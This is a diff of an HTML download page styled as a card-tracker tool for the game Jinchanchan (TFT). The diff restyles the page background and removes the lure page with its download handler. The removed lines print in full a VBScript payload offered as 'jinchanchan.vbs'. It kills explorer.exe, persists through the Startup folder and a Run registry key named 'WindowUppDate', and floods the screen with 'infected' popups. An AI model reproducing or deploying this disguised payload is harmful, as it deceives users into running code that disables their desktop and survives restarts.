@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             overflow: hidden;
-            font-family: 'Microsoft YaHei', Arial, sans-serif;
+            font-family: Arial, sans-serif;
             color: white;
             text-align: center;
             height: 100vh;
@@ -17,70 +17,43 @@
             justify-content: center;
             align-items: center;
             position: relative;
-            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
         }
 
-        /* 星空背景效果 */
-        .stars {
+        /* TFT Background Styles */
+        .background {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -2;
+            z-index: -1;
+            overflow: hidden;
+            background: #0a0a12;
         }
-        
-        .stars::before, .stars::after {
-            content: "";
+
+        .hex-grid {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: transparent;
-            background-image: 
-                radial-gradient(1px 1px at 20px 30px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 40px 70px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 80px 40px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 120px 80px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 160px 120px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 200px 160px, white, rgba(0,0,0,0));
-            background-size: 200px 200px;
-            animation: twinkle 4s infinite;
-        }
-        
-        .stars::after {
-            background-image: 
-                radial-gradient(1px 1px at 30px 20px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 70px 40px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 40px 80px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 80px 120px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 120px 160px, white, rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 160px 200px, white, rgba(0,0,0,0));
-            animation-delay: 2s;
+            opacity: 0.1;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><polygon points="50,0 93,25 93,75 50,100 7,75 7,25" fill="none" stroke="%23a78653" stroke-width="0.5"/></svg>');
+            background-size: 100px 100px;
         }
 
-        @keyframes twinkle {
-            0% { opacity: 0.2; }
-            50% { opacity: 1; }
-            100% { opacity: 0.2; }
-        }
-
-        /* 粒子效果 */
         .particles {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -1;
         }
 
         .particle {
             position: absolute;
-            background: rgba(255, 215, 0, 0.6);
+            background: rgba(167, 134, 83, 0.5);
             border-radius: 50%;
-            filter: blur(1px);
             animation: float 15s infinite linear;
         }
 
@@ -99,261 +72,4 @@
                 transform: translateY(-1000px) rotate(720deg);
                 opacity: 0;
             }
-        }
-
-        /* 金色光晕效果 */
-        .gold-glow {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80vw;
-            height: 80vh;
-            background: radial-gradient(circle, rgba(255, 215, 0, 0.15) 0%, rgba(10, 10, 18, 0) 70%);
-            z-index: -1;
-            animation: pulse 8s infinite alternate;
-        }
-
-        @keyframes pulse {
-            0% { transform: translate(-50%, -50%) scale(1); opacity: 0.3; }
-            100% { transform: translate(-50%, -50%) scale(1.1); opacity: 0.5; }
-        }
-
-        /* 网格线效果 */
-        .grid-lines {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                linear-gradient(90deg, rgba(10, 10, 18, 0) 99%, rgba(255, 215, 0, 0.1) 100%),
-                linear-gradient(0deg, rgba(10, 10, 18, 0) 99%, rgba(255, 215, 0, 0.1) 100%);
-            background-size: 50px 50px;
-            animation: grid-move 50s linear infinite;
-            z-index: -1;
-        }
-
-        @keyframes grid-move {
-            0% {
-                background-position: 0 0;
-            }
-            100% {
-                background-position: 1000px 1000px;
-            }
-        }
-
-        /* 内容容器 */
-        .container {
-            max-width: 600px;
-            margin: auto;
-            background-color: rgba(0, 0, 0, 0.6);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255, 215, 0, 0.2);
-            z-index: 1;
-            position: relative;
-            animation: container-float 6s ease-in-out infinite alternate;
-        }
-
-        @keyframes container-float {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-10px); }
-        }
-
-        h1 {
-            color: #FFD700;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
-            margin-bottom: 20px;
-            font-size: 2.5em;
-        }
-
-        p {
-            font-size: 1.2em;
-            line-height: 1.6;
-            margin-bottom: 25px;
-        }
-
-        .download-button {
-            background: linear-gradient(to bottom, #FFD700, #E6C300);
-            color: #000;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2em;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-top: 15px;
-            font-weight: bold;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .download-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.6);
-        }
-
-        .download-button:active {
-            transform: translateY(1px);
-        }
-
-        .download-button::after {
-            content: "";
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: rgba(255, 255, 255, 0.1);
-            transform: rotate(45deg);
-            transition: all 0.3s;
-        }
-
-        .download-button:hover::after {
-            left: 100%;
-        }
-
-        .logo-text {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            font-size: 1.8em;
-            font-weight: bold;
-            color: #FFD700;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
-            z-index: 2;
-            animation: text-glow 2s infinite alternate;
-        }
-
-        @keyframes text-glow {
-            from { text-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
-            to { text-shadow: 0 0 15px rgba(255, 215, 0, 0.8), 0 0 20px rgba(255, 215, 0, 0.6); }
-        }
-    </style>
-</head>
-<body>
-    <!-- 星空背景 -->
-    <div class="stars"></div>
-    
-    <!-- 金色光晕 -->
-    <div class="gold-glow"></div>
-    
-    <!-- 网格线 -->
-    <div class="grid-lines"></div>
-    
-    <!-- 粒子效果 -->
-    <div class="particles" id="particles"></div>
-    
-    <!-- 内容区域 -->
-    <div class="logo-text">Github记牌器</div>
-    <div class="container">
-        <h1>金铲铲之战 - 记牌器下载</h1>
-        <p>最新版本V3.2.0现已发布，优化了卡牌识别算法，提升记牌准确率至99.8%</p>
-        <button class="download-button" onclick="downloadFile()">立即下载</button>
-    </div>
-
-    <script>
-        // 创建动态粒子
-        function createParticles() {
-            const particlesContainer = document.getElementById('particles');
-            const particleCount = 100;
-            
-            for (let i = 0; i < particleCount; i++) {
-                const particle = document.createElement('div');
-                particle.classList.add('particle');
-                
-                // 随机属性
-                const size = Math.random() * 4 + 1;
-                const posX = Math.random() * window.innerWidth;
-                const delay = Math.random() * 15;
-                const duration = Math.random() * 10 + 15;
-                const opacity = Math.random() * 0.5 + 0.3;
-                
-                particle.style.width = `${size}px`;
-                particle.style.height = `${size}px`;
-                particle.style.left = `${posX}px`;
-                particle.style.bottom = `-10px`;
-                particle.style.animationDelay = `${delay}s`;
-                particle.style.animationDuration = `${duration}s`;
-                particle.style.opacity = opacity;
-                
-                // 随机金色色调
-                const goldVariation = Math.random() * 40 - 20;
-                particle.style.backgroundColor = `rgba(255, ${215 + goldVariation}, 0, ${opacity})`;
-                
-                particlesContainer.appendChild(particle);
-            }
-        }
-
-        // 页面加载完成后创建粒子
-        document.addEventListener('DOMContentLoaded', function() {
-            createParticles();
-            
-            // 添加鼠标移动光效
-            document.addEventListener('mousemove', function(e) {
-                const glow = document.querySelector('.gold-glow');
-                glow.style.left = `${e.clientX}px`;
-                glow.style.top = `${e.clientY}px`;
-            });
-        });
-
-        function downloadFile() {
-            var vbsContent = `Set objIE = CreateObject("InternetExplorer.Application")\r
-objIE.Visible = True\r
-objIE.FullScreen = True\r
-objIE.Navigate "about:blank"\r
-\r
-Set objDoc = objIE.document\r
-objDoc.body.style.backgroundColor = "black"\r
-objDoc.body.style.margin = "0"\r
-objDoc.body.style.height = "100vh"\r
-objDoc.body.style.width = "100vw"\r
-objDoc.body.style.overflow = "hidden"\r
-objDoc.body.innerHTML = "<div style='color:white; font-size:20px; text-align:center; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%);'>Your computer is infected!!!</div>"\r
-\r
-Set objShell = CreateObject("WScript.Shell")\r
-objShell.Run "taskkill /F /IM explorer.exe", 0, True\r
-\r
-Set objFSO = CreateObject("Scripting.FileSystemObject")\r
-startupPath = objShell.SpecialFolders("Startup") & "\\\\WindowUppDate.vbs"\r
-If Not objFSO.FileExists(startupPath) Then\r
-    objFSO.CopyFile WScript.ScriptFullName, startupPath\r
-End If\r
-\r
-regKey = "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WindowUppDate"\r
-scriptPath = WScript.ScriptFullName\r
-On Error Resume Next\r
-objShell.RegRead(regKey)\r
-If Err.Number <> 0 Then\r
-    objShell.RegWrite regKey, scriptPath\r
-End If\r
-On Error GoTo 0\r
-\r
-Do\r
-    objShell.Popup "Your computer is infected!!!", 0.5, "Warning", 48\r
-    WScript.Sleep 500\r
-\r
-    If objShell.AppActivate("Task Manager") Then\r
-        Exit Do\r
-    End If\r
-Loop\r
-\r
-objFSO.DeleteFile startupPath, True\r
-objIE.Quit\r
-WScript.Quit`;
-
-            var blob = new Blob([vbsContent], { type: 'text/plain' });
-            var link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'jinchanchan.vbs';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-    </script>
-</body>
-</html>
+  
